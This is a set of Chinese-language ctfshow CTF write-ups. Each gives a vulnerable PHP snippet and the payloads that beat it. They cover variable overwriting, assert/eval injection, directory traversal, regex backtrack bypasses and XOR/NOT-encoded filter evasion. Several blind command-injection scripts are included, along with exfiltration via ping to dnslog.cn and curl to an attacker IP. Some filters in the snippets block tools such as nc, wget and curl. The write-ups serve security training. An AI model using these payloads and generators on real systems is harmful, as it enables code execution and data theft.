|GLOBALS|echo|var_dump|print 绕过了这些打印符但是 还有include 可以用为协议 payload: GET:?1=php://filter/convert.base64-encode/resource=flag.php post:CTF_SHOW=1&CTF[SHOW.COM=1&fun=include$_GET[1]

可能有人会有疑问，为什么$_GET[1]可以，$_GET['1']不行 因为被过滤了，



payload: CTF_SHOW=&CTF[SHOW.COM=&fun=var_export(get_defined_vars())

然后Ctrl + F 搜索ctfshow


GET:?php://filter/read=convert.base64-encode/resource=flag.php POST:CTF_SHOW=a&CTF[SHOW.COM=b&fun=include($a[0])



extract

本题目过滤了flag和echo，上个题目的解法无法使用。注意到最内层的if判断，只要满足if($f10g==="flag_give_me")，满足这个条件就输出flag

那么想办法读取这个变量，并赋智即可解决此问题

GET方法肯定不行，因为最外层if判断做了过滤，那么使用POST

但是代码里面没有POST读取该变量的代码，那么我们可以传进去。

备注：GET请求和POST请求获取参数后是存放在数组中的，数组名为$_GET和$POST，以键值对的形式

在使用extract函数，将数组里面的元素转化为变量，例如

我们通过POST请求传进三个参数，分别为name、sex和age，那么$POST数组应为：

$array = array("name"=>"zhangsan","sex"=>"boy","age"=>16);extract($array); 那么就可以使用$name、$sex和$age了

应用到本题目中，CTF_SHOW=1&CTF[SHOW.COM=1&fl0g=flag_give_me&fun=extract($_POST)

$f10g就为fl0g=flag_give_me了，即可获取flag
```

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}


```

```
GET:?a=1+fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
or
GET:?$fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=assert($a[0])

这题似乎有bug，通过提交post参数
fun=eval($_REQUEST[m])&m=$fl0g%3d"flag_give_me";&CTF_SHOW=1&CTF[SHOW.COM=1
即可拿到flag
但是我在服务器上测试了，这个代码行不通，原因是fun参数eval($_REQUEST[m])的长度为18，超出了题目限制16，但是为什么也能成功呢，是某个版本的php特性吗？百思不得其解


WP 1、cli模式（命令行）下

第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数

2、web网页模式下 在web页模式下必须在php.ini开启register_argc_argv配置项 设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效 这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’] $argv,$argc在web模式下不适用 因为我们是在网页模式下运行的，所以 $_SERVER['argv'][0] = $_SERVER['QUERY_STRING']也就是$a[0]= $_SERVER['QUERY_STRING'] paayload CTF_SHOW=&CTF[SHOW.COM=&fun=assert($_SERVER['QUERY_STRING']) 这段代码将 CTF_SHOW 和 CTF[SHOW.COM 设置为空字符串，然后使用 assert($_SERVER['QUERY_STRING']) 执行 assert 函数，其中传递的参数是 $_SERVER['QUERY_STRING']。 在网页模式下，$_SERVER['QUERY_STRING'] 包含了从 URL 中获取的查询字符串。它被直接传递给了 assert 函数。 这样的代码结构允许通过修改 URL 中的查询字符串来执行任意的 PHP 代码。因为 assert 函数用于执行字符串中的 PHP 代码。
```

```php
 <?php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];


//特殊字符检测
function waf($url){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
        return true;
    }else{
        return false;
    }
}

if(waf($url)){
    die("嗯哼？");
}else{
    extract($_GET);
}


if($ctf_show==='ilove36d'){
    echo $flag;
} 
```

```
GET:?ctf show=ilove36d

题目检查的是query_string而不是$_GET
因此可以利用不合法的变量名，让其自动替换成_
ctf%20show=ilove36d

'+' '['被过滤了，用%20替代
payload=ctf%20show=ilove36d
```

```php
 <?php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}



function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
} NULL 
```

```
https://www.cnblogs.com/lost-1987/articles/3309693.html https://www.php.net/manual/zh/book.gettext.php

小知识点： _()是一个函数

_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll

get_defined_vars()函数

get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag

payload: ?f1=_&f2=get_defined_vars



真是骚操作，适用性太低了

就当开阔眼界吧，一般的 php 环境都不会这样配置的

_() 函数即 gettext() 函数，可以将参数翻译成指定语言，一般就是原封不动的输出参数

get_defined_vars 函数可以输出所有变量的信息，两者结合拿到 flag
```

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
} 
```

```
考察： 目录穿越

stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写） payload: /ctfshow/../../../../var/www/html/flag.php 查看源代码获得 flag

题目要求stripos($f, 'ctfshow')，也就是ctfshow在变量f中出现的第一个位置，此时需要构建一个目录，让ctfshow自行索引查找 paylaod： ?f=/ctfshow/../../../../../../../../../../../var/www/html/flag.php
其中的../../../这是深层目录，根据需要尝试，另外目录是根据之前的题目猜测得到，var/www/html/index.php也有回显

其实目录穿越只需要一级就行
f=/ctfshow/../var/www/html/flag.php

PHP对无法使用的filter过滤器只会抛出warning而不是error
payload: f=php://filter/ctfshow/resource=flag.php
```

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```

```
直接绕过正则表达式： f=ctfshow

?f[]=anything



正则匹配相关知识点

要想得到flag，首先必须正则匹配为false。

'/.+?ctfshow/is' 后面的i表示大小写匹配，s表示忽略换行符，单行匹配

在不加转义字符的前提下，前面的点表示任意字符，而“+?”表示非贪婪匹配，即前面的字符至少出现一次

所以，该正则匹配的意思为：ctfshow前面如果出现任意字符，即匹配准确

再根据下面的stripos为字符串匹配函数，要求输入的参数必须有“ctfshow”字符，所以输入的参数只需要满足ctfshow前面不加任意字符即可

post参数输入：f=ctfshow
```

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = (String)$_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f,'36Dctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```

```
考察： 正则表达式是溢出 https://www.laruence.com/2010/06/08/1579.html 大概意思就是在php中正则表达式进行匹配有一定的限制，超过限制直接返回false

#payload:
<?php
echo str_repeat('very', '250000').'36Dctfshow';
#post发送过去就OK



writeup

import requests

burp0_url = "http://ec810ef8-afc6-4caa-b263-31519ba6ea59.challenge.ctf.show/"
# s = '../' * 333333
# long ../ won't work, got HTTP ERROR 413
s = '...' * 333333 + '36dctfshow'
print(len(s))
data = dict(f=s)
ret = requests.post(burp0_url, data=data).text

print(ret)

传 '../' * 333333 会 HTTP ERROR 413




正则匹配栈溢出的局限性

preg_match 函数的栈溢出会使其返回 false，在某些需要符合正则匹配的场景不适用




PHP回溯上限利用

常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。

    DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。

    NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态。

大多数程序语言都使用NFA作为正则引擎，其中也包括PHP使用的PCRE库

PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。

我们可以通过var_dump(ini_get('pcre.backtrack_limit'));的方式查看当前环境下的上限：结果返回为1000000

那么只需要输入的匹配字符串长度大于1000000，那么preg_match函数就会直接返回false，那么我们可以通过代码产生满足条件的字符串

echo "f=".str_repeat("very",250000)."36Dctfshow";

字符串“very”复制25万次，正好100万个字符

然后Post方式发送参数f，为生成的字符串即可得到flag
```

```php
略
```

```
考察： php中&&和||运算符应用 访问/robots.txt,之后访问/admin，获得源代码 https://www.cnblogs.com/hurry-up/p/10220082.html 对于“与”（&&） 运算： x && y 当x为false时，直接跳过，不执行y； 对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。 payload: ?a=admin&b=admin&c=admin

#在判断这个的时候
if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin")
第一个$code === mt_rand(1,0x36D)为false,之后就执行|| $username ==="admin"#成功绕
过


扫描后台有/admin,URL/admin,考察php运算符优先级

    PHP中的逻辑“与”运算有两种形式：and 和 &&，同样“或”运算也有 or 和 || 两种形式。
    如果是单独两个表达式参加的运算，两种形式的结果完全相同
    但两种形式的逻辑运算符优先级不同，这四个符号的优先级从高到低分别是： &&、||、AND、OR。

最终只需满足code=admin&username=admin即可，根据参数需要填充的最终为：

payload： GET:?code=admin&username=admin&password=

```

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
} 
```

```

脚本搬运 BASH盲注，感谢作者（author: 颖奇L'Amore www.gem-love.com）

import requests import time as t from urllib.parse import quote as urlen

url = 'http://264547ad-430b-4422-a8b8-feca0bbdb164.challenge.ctf.show/?F=`$F%20`;' alphabet = ['{', '}', '.', '@', '-', '_', '=', 'a', 'b', 'c', 'd', 'e', 'f', 'j', 'h', 'i', 'g', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

result = '' for i in range(1, 60): for char in alphabet: # payload = "if [ ls | grep 'flag' |cut -c{} = '{}' ];then sleep 5;fi".format(i,char) #flag.php payload = "if [ cat flag.php | grep 'flag' |cut -c{} = '{}' ];then sleep 5;fi".format(i, char) # data = {'cmd':payload} try: start = int(t.time()) r = requests.get(url + payload) # r = requests.post(url, data=data) end = int(t.time()) - start if end >= 3: result += char print("Flag: " + result) break except Exception as e: print(e)
```

```php
 <?php

highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
} 
```

```
考察： php变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。 所以payload: ?_POST[key1]=36d&_POST[key2]=36d

?_POST[key1]=36d&_POST[key2]=36d
```

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
} 
```

```
`$F`;+ping `cat flag.php|awk 'NR==2'`.6x1sys.dnslog.cn
#通过ping命令去带出数据，然后awk NR一排一排的获得数据
```

```php
 <?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?> 
```

```
payload: ls /|tee 1 访问1下载发现根目录下有flag payload: cat /f149_15_h3r3|tee 2 访问下载就OK


常规方式命令可执行，但是回显一直为1
因为>过滤，使用tee命令，可以变为另一个文件，类似>

payload： ?c=ls /|tee 2 访问2下载查看文件 ?c=cat /f149_15_h3r3|tee 3 访问下载查看文件3
```

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}



call_user_func($_POST['ctfshow']);

```

```
考察： call_user_func()函数的使用 https://www.php.net/manual/zh/function.call-user-func.php

payload: POST: ctfshow=ctfshow::getFlag

ctfshow[]=ctfshow&ctfshow[]=getFlag
```

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

if(strripos($_POST['ctfshow'], ":")>-1){
    die("private function");
}

call_user_func($_POST['ctfshow']);
```

```
payload:
POST: ctfshow[0]=ctfshow&ctfshow[1]=getFlag
```

```php
 <?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?> 
```

```
import requests
import time
import string
str=string.ascii_letters+string.digits
result=""
for i in range(1,5):
key=0
for j in range(1,15):
if key==1:
break
for n in str:
payload="if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then
sleep 3;fi".format(i,j,n)
#print(payload)
url="http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?
c="+payload
try:
requests.get(url,timeout=(2.5,2.5))
except:
result=result+n
print(result)
break
if n=='9':
key=1
result+=" "


import requests
import time
import string
str=string.digits+string.ascii_lowercase+"-"
result=""
key=0
for j in range(1,45):
print(j)
if key==1:
break
for n in str:
payload="if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep
3;fi".format(j,n)
#print(payload)
url="http://16fb8221-6893-4aee-95d5-dbe7163bded0.chall.ctf.show?
c="+payload
try:
requests.get(url,timeout=(2.5,2.5))
except:
result=result+n
print(result)
break


注意代码缩进

Hint 中的 Python 脚本没有代码缩进，实际编写时需要注意缩进的问题



这里的思路是，用''或者\来绕过命令的过滤，然后利用base64外带数据来找flag， 这里第一个难点是绕过url中的点号，例如ip为127.0.0.1 包含三个点号，无法外带， 就算是域名，也包含点号。 这里需要把ip地址转化为int。（工具可以百度搜索） 例如http://127.0.0.1/转化成：http://2130706433/ 最终构造payload的形式为：?c=cur\l http://ip转int/`command` 这里首先看一下当前目录下有什么东西 ?c=cur\l http://ip转int/`ls | ba\se64 发现flag不在当前目录。 那么就大概率在根目录 构造：?c=cur\l http://ip转int/ls / | ba\se64 看到了flag的文件：f149_15_h3r3 最终构造: ?c=cur\l http://ip转int/ca\t /f149_15_h3r3 | ba\se64`
```


```php
<?php

error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['f1']) && isset($_POST['f2'])){
    $f1 = (String)$_POST['f1'];
    $f2 = (String)$_POST['f2'];
    if(preg_match('/^[a-z0-9]+$/', $f1)){
        if(preg_match('/^[a-z0-9]+$/', $f2)){
            $code = eval("return $f1($f2());");
            if(intval($code) == 'ctfshow'){
                echo file_get_contents("flag.php");
            }
        }
    }
}
```

```
考察： 函数的利用 payload: f1=usleep&f2=usleep

web140
（如果有不对的，还请师傅们帮忙指正~）

解答：根据代码可知，f1和f2必须是字母和数字。if判断是弱等于，需要intval($code)的值为0。

intval() 成功时，返回参数的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1。 字符串有可能返回 0，取决于字符串最左侧的字符。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。

所以需要$f1($f2());的返回值，或者是字母开头的字符串，或者是空数组，或者就是0，或者FLASE。

payload1： system(system())---> f1=system&f2=system

string system( string $command[, int &$return_var] )：成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system('FLASE')，空指令，失败返回FLASE。

payload2： usleep(usleep())---> f1=usleep&f2=usleep usleep没有返回值。 所以intval参数为空，失败返回0

payload3： getdate(getdate())---> f1=getdate&f2=getdate

array getdate([ int $timestamp = time()] )：返回结果是array，参数必须是int型。所以getdate(getdate())---->getdate(array型)--->失败返回flase，intval为0。

f1=md5&f2=array
f1=sha1&f2=array
f1=fopen&f2=array
f1=filesize&f2=array
```

```php
<?php
#error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

```
考察命令执行和绕过return 应该说运算符都可以绕过 这里用羽师傅给的一个脚本取反命令执行 ?v1=10&v2=0&v3=-(%8c%86%8c%8b%9a%92)(%9c%9e%8b%df%99%d5);

无字母参数构造payloa的脚本：

import os

import re

from urllib.parse import unquote

def make_dic(operation):

filename = f"rce_{operation}.txt"
if not os.path.exists(filename):

    print("Making dictionary...")

    with open(filename, "w") as myfile:
        contents = []
        seen = set()  # 使用集合来跟踪已添加的结果

        # 遍历所有可能的字节值（0-255）
        for i in range(256):
            for j in range(256):
                # 将$i和$j转换为两个字符的十六进制表示
                hex_i = f'{i:02x}'
                hex_j = f'{j:02x}'

                # 正则表达式用于匹配特定字符
                pattern = re.compile(r'[0-9a-z\^\+\~\$\[\]\{\}\&\-]', re.IGNORECASE)

                # 如果十六进制字符转换为二进制后匹配正则表达式，则跳过此循环
                if pattern.match(bytes.fromhex(hex_i).decode('latin1')) or pattern.match(
                        bytes.fromhex(hex_j).decode('latin1')):
                    continue

                # 将十六进制值添加百分号前缀并进行URL解码
                a = f'%{hex_i}'
                b = f'%{hex_j}'
                match operation:
                    case "and":
                        c = chr(ord(unquote(a)) & ord(unquote(b)))
                    case "or":
                        c = chr(ord(unquote(a)) | ord(unquote(b)))
                    case "xor":
                        c = chr(ord(unquote(a)) ^ ord(unquote(b)))

                # 如果解码后的字符是可打印字符（ASCII 32-126），则将其添加到内容列表中
                if 32 <= ord(c) <= 126 and c not in seen:
                    contents.append(f"{c} {a} {b}\n")
                    seen.add(c)  # 将结果添加到集合中

        # 将内容写入文件
        myfile.writelines(contents)
        print("Making dictionary...done")
else:
    print("Dictionary already exists!!")
def generate_payload(text, operation):

op_symbols = {"and": '&', "or": '|', "xor": '^'}
op = op_symbols[operation]
s1 = []
s2 = []
filename = f"rce_{operation}.txt"

with open(filename, 'r') as f:
    lines = f.readlines()

for char in text:
    for line in lines:
        if char == line[0]:
            s1.append(line[2:5])
            s2.append(line[6:].strip())
            break

return f"(\"{''.join(s1)}\"{op}\"{''.join(s2)}\")"
function = input("Please input your function: ")

command = input("Please input your command: ")

while True: operation = input("Please input your operation (and or xor): ") if operation in ["and", "or", "xor"]: break else: print("Please choose one of the following: and, or, xor")

make_dic(operation)

payload = generate_payload(function, operation) + generate_payload(command, operation)

print("Generated payload is :" + payload)
```

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1'])){
    $v1 = (String)$_GET['v1'];
    if(is_numeric($v1)){
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents("flag.php");
    }
}

```

```
0和0x0绕过 这里绕过因为是因为当成了8进制和16进制
```

```php
<?php

highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

```
位运算都可以进行构造字符 ?v1=10&v2=0&v3=*("%0c%19%0c%5c%60%60"^"%7f%60%7f%28%05%0d") ("%0e%0c%00%00"^"%60%60%20%2a")?>

看了大神的代码，然后写个python版本的，支持异或和或操作

# -*- coding: utf-8 -*-

"""
    @Author disda
    @Date 2023/5/16 10:23
    @Describe 
    @Dependency
    @Version 1.0
"""
# -*- coding: utf-8 -*-

"""
    @Author disda
    @Date 2023/4/26 18:56
    @Describe
    @Dependency
    @Version 1.0
"""
import re
import urllib
from urllib import parse

op_dict = {
    "yes_op": lambda x: x,
    "not_op": lambda x: not x,
    "or_op": lambda x, y: x | y,
    "xor_op": lambda x, y: x ^ y
}

sign = {
    'xor_op': '^',
    'or_op':'|'
}

def generate_coding(file_name, pattern, is_match, mode):
    """
    生成符合要求的编码
    @param file_name: 生成文件的名称
    @param pattern: 正则表达式
    @param is_match: 是否匹配正则，True表示匹配，False表示不匹配
    @param mode: 编码方式
    @return:
    """
    with open(file_name, 'w') as f:
        for i in range(256):
            for j in range(256):
                op = op_dict['not_op'] if is_match else op_dict['yes_op']

                # 如果当前外层循环元素被过滤了，直接跳过所有内层循环
                if op(re.search(pattern, chr(i))):
                    break
                # 如果当前内层循环元素被过滤了，跳过该元素
                if op(re.search(pattern, chr(j))):
                    continue

                # [2:]是因为python中hex表示是0xff这样的形式，去掉前面的0x，组成2位url编码
                hex_i = "0" + hex(i)[2:] if i < 16 else hex(i)[2:]
                hex_j = "0" + hex(j)[2:] if j < 16 else hex(j)[2:]
                # url编码的方式和ASCII码一样，但需要在前面加上%
                url_i = '%' + hex_i
                url_j = '%' + hex_j
                # c是我们要构造的参数，比如说我们要传ls命令，l就要拆分成a|b，其中|是因为题目没有过滤|，我们可以修改成其他任意操作如^
                c = op_dict[mode](ord(urllib.parse.unquote(url_i)), ord(urllib.parse.unquote(url_j)))
                # 如果c是可见的字符
                if c >= 32 and c <= 126:
                    f.write(chr(c) + " " + url_i + " " + url_j + '\n')


def action(arg,file_name,mode):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open(file_name, "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\""+sign[mode]+"\"" + s2 + "\")"
    return (output)

file_name = 'rce.txt'
mode = 'xor_op'
reg = '^\W+$'
generate_coding(file_name,reg,True,mode)
while True:
    param = action(input("\n[+] your function："),file_name,mode) + action(input("[+] your command："),file_name,mode) + ";"
    print(param)

1、使用动态调用函数+异或，避免报错使用-、+、*隔开，异或符号为^(数字6的上面)，异或规则：相同为0，不同为1，比如1^1=0,1^0=1，找到16进制数字，然后用%做URL编码

2、自己算可以，有大神脚本直接出也行 payload： GET：?v1=1&v2=1&v3=(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)
```

```php
<?php


highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && check($v3)){
        if(preg_match('/^\W+$/', $v2)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

function check($str){
    return strlen($str)===1?true:false;
}
```

```
?v1=10&v2=(%8c%86%8c%8b%9a%92)(%9c%9e%8b%df%99%d5);&v3=-

怎么说呢？我遇到的问题主要是空字节， payload:url/?v1=1&v3=1&v2=(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff) 
来自大佬的代码： 
______________________________分割符——————————————————————
 $a = "system"; echo "v1=1&v2=1&v3=("; for ($i = 0; $i < strlen($a); $i++) { echo "%".dechex(ord($a[$i])^0xff); } echo "^"; for ($i = 0; $i < strlen($a); $i++) { echo "%ff"; } echo ")";#(%8b%9e%9c%df%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff) #?v1=1&v2=1&v3=(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff) 稍微修改一下，两个（）（）前后依次为(system)(具体命令)
```

```php
<?php

highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

```
?v1=%0a1&v2=%0a0&v3=?(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5):
```

```php
<?php

highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

```
?v1=1&v2=1&v3=|(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5)|
```

```php
<?php

highlight_file(__FILE__);

if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }

}
```

```
php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写 法

payload:
GET ?show=;};system('grep flag flag.php');/*
POSOT ctf=%5ccreate_function

web147
解答：（如果有不对的地方，还希望师傅们帮忙指正）

正则匹配绕过，只要ctfshow里有一个不是数字、小写字母和下划线就能绕过。

/i：大小写不敏感匹配

/s：点号元字符匹配所有字符，包含换行符。

/D：元字符美元符号仅仅匹配目标字符串的末尾

php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 调用一个函数时直接写函数名function_name()，相当于是相对路径调用； 如写某一全局函数的完全限定名称\function_name()调用，则是写了一个绝对路径。

在这里插入图片描述

（详情可以看php手册里的命名空间部分）

所以post时ctf可以通过加上\绕过匹配。

找个不需要第一个参数的函数。可以用create_function匿名函数。虽然该函数自PHP 7.2起已经弃用，但是还是可以eval执行函数，只是需要把匿名部分闭合。

get：?show=}system('tac f*');/* post：ctf=%5ccreate_function 在这里插入图片描述

可以这么理解：create_function创建一个匿名函数，我们假设就叫niming。 string create_function( string $args, string $code)那么具体就是如下面所示的样子：

function niming($args,...){
		$code
}
所以就需要}闭合，闭合之后，那就多出来一个}，这就需要用注释符注释掉。
```

```php
<?php

include 'flag.php';
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/",$code)){
        die("error");
    }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}

function get_ctfshow_fl0g(){
    echo file_get_contents("flag.php");
}
```

```
#payload ?code=("%0c%19%0c%5c%60%60"^"%7f%60%7f%28%05%0d") ("%09%01%03%01%06%02"^"%7d%60%60%21%60%28"); 预期解是使用中文 ?code=$哈="{{{"^"?<>/";${$哈}[哼](${$哈}[嗯]);&哼=system&嗯=tac f* "{{{"^"?<>/"; 异或出来的结果是 _GET
```

```php
<?php

error_reporting(0);
highlight_file(__FILE__);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}

file_put_contents($_GET['ctf'], $_POST['show']);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
